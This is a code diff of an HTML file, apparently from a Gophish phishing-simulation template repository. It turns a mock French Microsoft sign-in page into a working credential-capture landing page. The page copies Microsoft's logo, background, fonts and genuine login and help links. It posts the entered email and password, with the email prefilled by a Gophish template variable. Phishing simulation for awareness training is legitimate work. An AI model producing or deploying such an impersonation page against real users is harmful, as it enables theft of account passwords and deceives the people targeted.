@@ -1,259 +1,302 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <style>
-        @font-face {
-            font-family: 'Segoe UI';
-            src: local('Segoe UI'), local('SegoeUI'), url('https://fonts.cdnfonts.com/css/segoe-ui');
+<!DOCTYPE html><html lang="fr"><head><meta charset="utf-8"/><meta http-equiv="X-UA-Compatible" content="IE=edge"/><meta name="viewport" content="width=device-width, initial-scale=1"/>
+	<title>Connectez-vous à votre compte</title>
+	<link href="https://github.com/PassAndSecure/Template_Gophish/blob/4cd0bc9b249bde55e4f15e64e51bb42f11b306a6/Picture-Template/logo-micro-1.png?raw=true" rel="shortcut icon"/>
+	<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet"/>
+	<style type="text/css">@font-face {
+            font-family: 'Segoe UI Webfont';
+            font-weight: normal;
+            font-style: normal;
         }
+
         body {
             margin: 0;
-            background: linear-gradient(135deg, #f0f7ff, #d9ecff);
+            background-image: url('https://github.com/PassAndSecure/Template_Gophish/blob/main/Picture-Template/mslogin.png?raw=true');
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            background-size: cover;
             height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Segoe UI Webfont', -apple-system, 'Helvetica Neue', 'Lucida Grande', 'Roboto', 'Ebrima',
+                'Nirmala UI', 'Gadugi', 'Segoe Xbox Symbol', 'Segoe UI Symbol', 'Meiryo UI', 'Khmer UI', 'Tunga',
+                'Lao UI', 'Raavi', 'Iskoola Pota', 'Latha', 'Leelawadee', 'Microsoft YaHei UI', 'Microsoft JhengHei UI',
+                'Malgun Gothic', 'Estrangelo Edessa', 'Microsoft Himalaya', 'Microsoft New Tai Lue', 'Microsoft
+                PhagsPa', 'Microsoft Tai Le', 'Microsoft Yi Baiti', 'Mongolian Baiti', 'MV Boli', 'Myanmar Text',
+                'Cambria Math';
+            flex-direction: column;
         }
+
         .login-container {
             background: white;
             padding: 40px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            max-width: 400px;
+            max-width: 440px;
             width: 100%;
             text-align: left;
         }
+
         .login-header {
             display: flex;
-            align-items: center;
-            margin-bottom: 30px;
+            flex-direction: column;
+            align-items: flex-start;
         }
-        .login-header img {
-            width: 24px;
-            height: 24px;
-            margin-right: 8px;
-        }
-        .login-header h2 {
-            font-size: 24px;
-            font-weight: 600;
-            margin: 0;
-            color: #1b1b1b;
-        }
+
         .form-group {
+            position: relative;
             margin-bottom: 20px;
         }
+
         .form-control {
             border: none;
-            border-bottom: 1px solid #ccc;
+            border-bottom: 1px solid #1b1b1b;
             border-radius: 0;
-            padding: 10px 0;
-            font-size: 16px;
-            width: 100%;
-            box-sizing: border-box;
+            height: calc(1.5em + .75rem + 2px);
+            padding: .375rem .75rem;
+            font-size: 1rem;
         }
+
         .form-control:focus {
             border-bottom: 2px solid #0078d4;
+            box-shadow: none;
             outline: none;
         }
+
         .form-control.error {
-            border-bottom: 2px solid #e81123;
+            border-bottom: 1px solid #e81123;
         }
+
         .error-message {
-            color: #e81123;
-            font-size: 14px;
-            margin-top: 5px;
+            color: #d93025;
+            font-size: 0.875em;
+            margin-top: 0.25em;
             display: none;
         }
+
+        .btn-primary {
+            color: black;
+            background-color: #CCCCCC;
+            border-color: #CCCCCC;
+            border-radius: 0;
+            font-size: 1rem;
+            width: 120px;
+            margin-right: 10px;
+            padding: 3px;
+        }
+
+        .btn-primary:hover {
+            color: black;
+            background-color: #B2B2B2;
+            border-color: #B2B2B2;
+        }
+
+        .btn-2 {
+            color: white;
+            background-color: #0067B8;
+            border-color: #0067B8;
+            border-radius: 0;
+            font-size: 1rem;
+            width: 120px;
+        }
+
+        .btn-2:hover {
+            color: white;
+            background-color: #005DA6;
+            border-color: #005DA6;
+        }
+
+        .text-links a:hover {
+            text-decoration: underline;
+            color: #6C7378;
+        }
+
+        .divider {
+            width: 100%;
+            height: 1px;
+            background-color: #ccc;
+            margin: 20px 0;
+        }
+
+        a {
+            color: #0067B8;
+        }
+
+        .option-connexion {
+            color: black;
+        }
+
+        .div-option-connexion {
+            background: white;
+            padding: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 440px;
+            width: 100%;
+            text-align: left;
+            margin-top: 20px;
+        }
+
+        .div-option-connexion:hover {
+            background: #CCCCCC;
+        }
+
+        .horizontal-links {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+
+        .horizontal-container {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .text-links {
+            text-align: left;
+        }
+
         .button-container {
             display: flex;
             justify-content: flex-end;
-            margin-top: 20px;
-        }
-        .btn-next {
-            background: #0067b8;
-            color: white;
-            border: none;
-            border-radius: 0;
-            padding: 8px 20px;
-            font-size: 16px;
-            cursor: pointer;
-            width: 100px;
-        }
-        .btn-next:hover {
-            background: #005da6;
-        }
-        .horizontal-links {
-            margin-top: 20px;
-            font-size: 14px;
-        }
-        .horizontal-links a {
-            color: #0067b8;
-            text-decoration: none;
-        }
-        .horizontal-links a:hover {
-            text-decoration: underline;
-        }
-        .forgot-password-link {
-            display: none;
             margin-top: 10px;
-            font-size: 14px;
+            margin-bottom: 7px;
         }
-        .forgot-password-link a {
-            color: #0067b8;
-            text-decoration: none;
-        }
-        .connection-options {
-            background: white;
-            border: 1px solid #ccc;
-            padding: 12px;
-            margin-top: 20px;
-            display: flex;
-            align-items: center;
-            cursor: pointer;
-        }
-        .connection-options:hover {
-            background: #f9f9f9;
-        }
-        .connection-options img {
-            width: 20px;
-            margin-right: 10px;
-        }
-        .connection-options a {
-            color: #1b1b1b;
-            text-decoration: none;
-            display: flex;
-            align-items: center;
-        }
+
         #password, #password-error {
             display: none;
         }
-        .email-header {
+
+        .email-container {
             display: flex;
             align-items: center;
-            margin-bottom: 20px;
+            margin-top: 10px;
         }
+
         .back-button {
             width: 24px;
             height: 24px;
             border-radius: 50%;
             border: none;
-            background: url('https://raw.githubusercontent.com/PassAndSecure/Template_Gophish/main/Picture-Template/fleche_mdp.svg') no-repeat center;
-            background-size: 16px;
+            background: url('https://github.com/PassAndSecure/Template_Gophish/blob/main/Picture-Template/fleche_mdp.svg?raw=true') no-repeat center center;
+            background-size: contain;
             cursor: pointer;
-            margin-right: 10px;
         }
+        
+        .back-button:hover {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            border: none;
+            background: url('https://github.com/PassAndSecure/Template_Gophish/blob/main/Picture-Template/fleche_mdp.svg?raw=true') no-repeat center center;
+            background-size: contain;
+            background-color:#F2F2F2;
+            cursor: pointer;
+        }
+        
         .email-display {
             font-size: 16px;
-            color: #1b1b1b;
-            margin-left: 10px;
+            font-family: Segoe UI, sans-serif;
+            color: #333;
         }
-    </style>
-    <title>Se connecter</title>
-</head>
-<body>
-    <div class="login-container">
-        <div class="login-header">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo"/>
-            <h2>Se connecter</h2>
-        </div>
 
-        <form autocomplete="off" action="">
-            <div class="form-group">
-                <span class="error-message" id="email-error">Entrez une adresse e-mail, un numéro de téléphone ou un identifiant Skype valide.</span>
-                <input type="email" class="form-control" id="email" placeholder="E-mail, téléphone ou identifiant Skype" required=""/>
-            </div>
+        .forgot-password-link {
+            display: none;
+            font-size: 13px;
+            margin-top: 10px;
+        }
 
-            <div class="form-group">
-                <span class="error-message" id="password-error">Veuillez saisir votre mot de passe.</span>
-                <input type="password" class="form-control" id="password" placeholder="Mot de passe" required=""/>
-            </div>
-
-            <div class="connection-options" onclick="alert('Options de connexion : Connexion avec un code, une clé de sécurité, etc.')">
-                <a href="#">
-                    <img src="https://raw.githubusercontent.com/PassAndSecure/Template_Gophish/4cd0bc9b249bde55e4f15e64e51bb42f11b306a6/Picture-Template/key-2.png" alt="Options de connexion"/>
-                    <span>Options de connexion</span>
-                </a>
-            </div>
-
-            <div class="horizontal-links">
-                <p>Pas de compte ? <a href="#" onclick="alert('Redirection vers la page de création de compte.')">Créez-en un !</a></p>
-                <p><a href="#" onclick="alert('Assistance pour les comptes inaccessibles.')">Votre compte n’est pas accessible ?</a></p>
-            </div>
-
-            <div class="forgot-password-link">
-                <a href="#" onclick="alert('Redirection vers la page de récupération de mot de passe.')">J’ai oublié mon mot de passe</a>
-            </div>
-
-            <div class="button-container">
-                <button type="button" class="btn-next" onclick="handleRedirect(event)">Suivant</button>
-            </div>
-        </form>
-    </div>
-
-    <script>
+        .custom-footer {
+            background-color: #F2F2F2;
+            text-align: left;
+            padding: 25px 40px 35px 40px;
+            font-family: Segoe UI Webfont, sans-serif;
+            font-size: 15px;
+            line-height: 20px;
+            color: #1b1b1b;
+            max-width: 440px;
+            width: 100%;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+	</style>
+	<script>
         function validateEmail() {
             const email = document.getElementById('email');
             const emailError = document.getElementById('email-error');
-            if (email.value.trim() === '') {
+            let valid = true;
+
+            if (email.value === '') {
                 emailError.style.display = 'block';
                 email.classList.add('error');
-                return false;
+                valid = false;
             } else {
                 emailError.style.display = 'none';
                 email.classList.remove('error');
-                return true;
             }
+
+            return valid;
         }
 
         function showPasswordField() {
             if (validateEmail()) {
                 const emailValue = document.getElementById('email').value;
+
+                document.querySelector('.button-container .btn-primary').style.display = 'none';
+                
                 document.getElementById('email').style.display = 'none';
                 document.getElementById('password').style.display = 'block';
-                document.querySelector('.connection-options').style.display = 'none';
-                document.querySelector('.horizontal-links').style.display = 'none';
-                document.querySelector('.forgot-password-link').style.display = 'block';
-                document.querySelector('.login-header').style.display = 'none';
+                document.getElementById('password-error').style.display = 'none';
 
-                const emailHeader = document.createElement('div');
-                emailHeader.className = 'email-header';
+                document.querySelector('.login-header p').textContent = 'Entrez le mot de passe';
+
+                document.querySelector('.login-header img').src = 'VOTRE_URL_LOGO';
+
+                document.querySelector('.login-header img').style.width = '125px';
+
+                document.querySelector('.login-header').style.marginBottom = '-25px';
+
+                document.querySelector("button[type='submit']").textContent = "Se connecter";
+                
+                const emailContainer = document.createElement('div');
+                emailContainer.classList.add('email-container');
 
                 const backButton = document.createElement('button');
-                backButton.className = 'back-button';
+                backButton.classList.add('back-button');
                 backButton.onclick = function() {
                     document.getElementById('password').style.display = 'none';
                     document.getElementById('email').style.display = 'block';
-                    document.querySelector('.connection-options').style.display = 'block';
-                    document.querySelector('.horizontal-links').style.display = 'block';
+                    document.querySelector('.login-header p').textContent = 'Se connecter';
+                    document.querySelector('.login-header img').src = 'https://raw.githubusercontent.com/PassAndSecure/Template_Gophish/4cd0bc9b249bde55e4f15e64e51bb42f11b306a6/Picture-Template/microsoft_logo.svg';
+
+                    document.querySelector('.login-header').style.marginBottom = '0px';
+                
+                    document.querySelector('.login-header').removeChild(document.querySelector('.email-container'));
+
+                    document.querySelector('.button-container .btn-primary').style.display = 'inline-block';
+
                     document.querySelector('.forgot-password-link').style.display = 'none';
-                    document.querySelector('.email-header').remove();
-                    document.querySelector('.login-header').style.display = 'flex';
+
+                    document.querySelector('.horizontal-links').style.display = 'block';
+
+                    document.querySelector('.div-option-connexion').style.display = 'block';
+                    document.querySelector('.custom-footer').remove();
                 };
 
-                const logo = document.createElement('img');
-                logo.src = 'https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg';
-                logo.alt = 'Microsoft Logo';
-                logo.style.width = '24px';
-                logo.style.height = '24px';
-                logo.style.marginRight = '8px';
-
-                const title = document.createElement('h2');
-                title.textContent = 'Se connecter';
-                title.style.fontSize = '24px';
-                title.style.fontWeight = '600';
-                title.style.margin = '0';
-                title.style.color = '#1b1b1b';
-
                 const emailDisplay = document.createElement('div');
-                emailDisplay.className = 'email-display';
+                emailDisplay.classList.add('email-display');
                 emailDisplay.textContent = emailValue;
 
-                emailHeader.appendChild(backButton);
-                emailHeader.appendChild(logo);
-                emailHeader.appendChild(title);
-                emailHeader.appendChild(emailDisplay);
+                emailContainer.appendChild(backButton);
+                emailContainer.appendChild(emailDisplay);
+                
+                document.querySelector('.login-header').insertBefore(emailContainer, document.querySelector('.login-header p'));
 
-                document.querySelector('.login-container form').prepend(emailHeader);
+                document.querySelector('.forgot-password-link').style.display = 'block';
+
+                document.querySelector('.horizontal-links').style.display = 'none';
+                
+                document.querySelector('.div-option-connexion').style.display = 'none';
+                
+                document.querySelector('.login-container').after(footer);
             }
         }
 
@@ -262,17 +305,49 @@
             const passwordError = document.getElementById('password-error');
 
             if (password.style.display === 'block') {
-                if (password.value.trim() === '') {
+                if (password.value === '') {
+                    event.preventDefault();
                     passwordError.style.display = 'block';
                     password.classList.add('error');
                 } else {
-                    alert('Connexion réussie ! Redirection vers la page d’accueil.');
-                    // window.location.href = 'https://test-phishing.my.canva.site';
+                    passwordError.style.display = 'none';
+                    password.classList.remove('error');
                 }
             } else {
+                event.preventDefault();
                 showPasswordField();
             }
         }
     </script>
-</body>
-</html>
+</head>
+<body>
+<div class="login-container">
+<div class="login-header"><img alt="Microsoft Logo" src="https://raw.githubusercontent.com/PassAndSecure/Template_Gophish/4cd0bc9b249bde55e4f15e64e51bb42f11b306a6/Picture-Template/microsoft_logo.svg" style="width: 100px;"/>
+<p style="font-size: 24px; line-height: 28px; font-family: Segoe UI; margin-top: 15px; font-weight: 600;">Se connecter</p>
+</div>
+
+<form action="" autocomplete="off" method="POST">
+<div class="form-group"><span class="error-message" id="email-error" style="font-size: 15px; line-height: 20px; font-family: Segoe UI; margin-top: 0px; font-weight: 400; color:#e81123;">Entrez une adresse e-mail, un numéro de téléphone ou identifiant Skype valide.</span> <input class="form-control" id="email" name="email" placeholder="E-mail, téléphone, ou identifiant Skype" required="" type="email" value="{{.Email}}"/></div>
+
+<div class="form-group"><span class="error-message" id="password-error" style="font-size: 15px; line-height: 20px; font-family: Segoe UI; margin-top: 0px; font-weight: 400; color:#e81123;">Veuillez saisir votre mot de passe.</span> <input class="form-control" id="password" placeholder="Mot de passe" required="" type="password"/></div>
+
+<div class="horizontal-links text-links">
+<p style="font-size: 13px;">Pas de compte ?<a class="renvoi-microsoft" href="https://login.live.com/oauth20_authorize.srf?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&amp;scope=openid+profile+https%3a%2f%2fwww.office.com%2fv2%2fOfficeHome.All&amp;redirect_uri=https%3a%2f%2fwww.office.com%2flandingv2&amp;response_type=code+id_token&amp;state=WZ1Ps4xKYP-x8bEgoRSNWYpVFyC7IoxZkfLIKZCD22OXdiOzcU_6IXZx53hlEYHa0y-JgLga7zwFmF7Enqdn9s6sa9eFXi8T-SsEG01Ll3M_llJK8G_nzTu5zDA0W-NYRsCMkQQu8yloabNryaap9V-Q8HRmmrLNT2V-DWrfXXMHx_xr4KbE3C2rojqNd_Hf7MteYDCy8-oSmMZessRuOEyGxVVowR045xww5vvhx_CwdDJHAykUY7NLMVjAr_3aVyR38S2E1GrHaLEiV3bD-g&amp;response_mode=form_post&amp;nonce=638583123147681488.YjEzMmY4ODQtMDc1Zi00YzZkLTkzMWUtMTc4ZTY3NmYyYzAxM2I5Mjk3ODAtMzczYS00Y2U2LTk0ZTItODA0ZTZiMjU0YjY3&amp;x-client-SKU=ID_NET8_0&amp;x-client-Ver=7.5.1.0&amp;uaid=37cdbff791fa4a82ba49ae74fba87b0f&amp;msproxy=1&amp;issuer=mso&amp;tenant=common&amp;ui_locales=fr&amp;signup=1&amp;lw=1&amp;fl=easi2&amp;epct=PAQABDgEAAAApTwJmzXqdR4BN2miheQMYbTSEyF78mbvzDxwndacZAcj36EvGLa3BqCIrsF8HGvP42UJiYXy9ynRCORo3mL5W3eEWWNztupkve_ECEPYrWnCZf6nWZKmgDq6aGbOXL-l6E1zD0pcnZGizHPeJmr5OIHibR-I3RDXlHm6v9bO05jC0olCH50LOtW4F70Y_McY0PhpG5NX7mSbrSw-JQloUU5wR7dFe6E6FApul0UXwDyAA&amp;jshs=0"> Créez-en un !</a></p>
+
+<p style="font-size: 13px;"><a href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&amp;redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&amp;response_type=code%20id_token&amp;scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&amp;response_mode=form_post&amp;nonce=638583123147681488.YjEzMmY4ODQtMDc1Zi00YzZkLTkzMWUtMTc4ZTY3NmYyYzAxM2I5Mjk3ODAtMzczYS00Y2U2LTk0ZTItODA0ZTZiMjU0YjY3&amp;ui_locales=fr&amp;mkt=fr&amp;client-request-id=37cdbff7-91fa-4a82-ba49-ae74fba87b0f&amp;state=WZ1Ps4xKYP-x8bEgoRSNWYpVFyC7IoxZkfLIKZCD22OXdiOzcU_6IXZx53hlEYHa0y-JgLga7zwFmF7Enqdn9s6sa9eFXi8T-SsEG01Ll3M_llJK8G_nzTu5zDA0W-NYRsCMkQQu8yloabNryaap9V-Q8HRmmrLNT2V-DWrfXXMHx_xr4KbE3C2rojqNd_Hf7MteYDCy8-oSmMZessRuOEyGxVVowR045xww5vvhx_CwdDJHAykUY7NLMVjAr_3aVyR38S2E1GrHaLEiV3bD-g&amp;x-client-SKU=ID_NET8_0&amp;x-client-ver=7.5.1.0#" style="font-size: 13px;">Votre compte n’est pas accessible ?</a></p>
+</div>
+
+<div class="forgot-password-link text-links"><a href="https://passwordreset.microsoftonline.com/">J&#39;ai oublié mon mot de passe</a></div>
+
+<div class="button-container"><button class="btn btn-primary" onclick="window.location.href = &#39; &#39;" style="margin-right: 4px; width: 114px;" type="button">Retour</button><button class="btn btn-primary btn-2" onclick="handleRedirect(event)" style="margin-right: 0px; width: 114px" type="submit">Suivant</button></div>
+</form>
+</div>
+
+<div class="div-option-connexion">
+<p style="display: flex; align-items: center; margin-bottom: 0; color: black;"><a href="https://www.office.com/login?ru=%2f" style="text-decoration: none;"><img alt="Microsoft Logo" src="https://github.com/PassAndSecure/Template_Gophish/blob/4cd0bc9b249bde55e4f15e64e51bb42f11b306a6/Picture-Template/key-2.png?raw=true" style="max-width: 9%; margin-left: 35px; vertical-align: middle;"/> <span style="margin-left: 10px;">Options de connexion</span> </a></p>
+</div>
+
+<div class="footer-links" style="position: absolute; bottom: 0px; right: 10px;"><a href="https://www.microsoft.com/fr/servicesagreement/" style="color: black; text-decoration: none; font-size: 12px; line-height: 28px; font-family: Segoe UI; font-weight: 400; margin-right: 13px;">Conditions d&#39;utilisation</a> <a href="https://privacy.microsoft.com/fr/privacystatement" style="color: black; text-decoration: none; font-size: 12px; line-height: 28px; font-family: Segoe UI; font-weight: 400; margin-right: 13px;">Confidentialité et cookies</a> <a href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&amp;redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&amp;response_type=code%20id_token&amp;scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&amp;response_mode=form_post&amp;nonce=638583123147681488.YjEzMmY4ODQtMDc1Zi00YzZkLTkzMWUtMTc4ZTY3NmYyYzAxM2I5Mjk3ODAtMzczYS00Y2U2LTk0ZTItODA0ZTZiMjU0YjY3&amp;ui_locales=fr&amp;mkt=fr&amp;client-request-id=37cdbff7-91fa-4a82-ba49-ae74fba87b0f&amp;state=WZ1Ps4xKYP-x8bEgoRSNWYpVFyC7IoxZkfLIKZCD22OXdiOzcU_6IXZx53hlEYHa0y-JgLga7zwFmF7Enqdn9s6sa9eFXi8T-SsEG01Ll3M_llJK8G_nzTu5zDA0W-NYRsCMkQQu8yloabNryaap9V-Q8HRmmrLNT2V-DWrfXXMHx_xr4KbE3C2rojqNd_Hf7MteYDCy8-oSmMZessRuOEyGxVVowR045xww5vvhx_CwdDJHAykUY7NLMVjAr_3aVyR38S2E1GrHaLEiV3bD-g&amp;x-client-SKU=ID_NET8_0&amp;x-client-ver=7.5.1.0#" style="color: black; text-decoration: none; font-size: 30px; font-weight: 200;">...</a></div>
+
+
+</body></html>
